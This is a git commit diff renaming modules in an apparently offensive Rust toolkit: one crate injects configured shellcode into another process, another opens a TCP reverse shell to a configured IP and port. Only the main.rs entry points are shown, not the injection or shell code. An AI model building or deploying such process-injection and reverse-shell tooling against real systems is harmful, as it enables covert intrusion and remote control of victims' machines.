54def57b1e80fbdc287e850b0aa4b54740e94fd5
Kevin <kmancxc@gmail.com>
2021-12-27 12:29:26 -0800

    ok final rename i think

--- process_migration/src/main.rs
+++ process_migration/src/main.rs
@@ -3,16 +3,16 @@ mod config;
 
 // Load the appropriate operating system's implementation
 #[cfg(unix)]
-mod rco_proc_mig_unix;
+mod rco_process_migration_unix;
 #[cfg(unix)]
-use rco_proc_mig_unix::inject_and_migrate;
+use rco_process_migration_unix::inject_and_migrate;
 
 #[cfg(windows)]
 extern crate windows;
 #[cfg(windows)]
-mod rco_proc_mig_windows;
+mod rco_process_migration_windows;
 #[cfg(windows)]
-use rco_proc_mig_windows::inject_and_migrate;
+use rco_process_migration_windows::inject_and_migrate;
 
 fn main() {
     inject_and_migrate(config::SHELLCODE);
--- tcp_reverse_shell/src/main.rs
+++ tcp_reverse_shell/src/main.rs
@@ -3,16 +3,16 @@ mod config;
 
 // Load the appropriate operating system's implementation
 #[cfg(unix)]
-mod rco_rev_shell_unix;
+mod rco_reverse_shell_unix;
 #[cfg(unix)]
-use rco_rev_shell_unix::shell;
+use rco_reverse_shell_unix::shell;
 
 #[cfg(windows)]
 extern crate windows;
 #[cfg(windows)]
-mod rco_rev_shell_windows;
+mod rco_reverse_shell_windows;
 #[cfg(windows)]
-use rco_rev_shell_windows::shell;
+use rco_reverse_shell_windows::shell;
 
 fn main() {
     shell(config::IP, config::PORT);
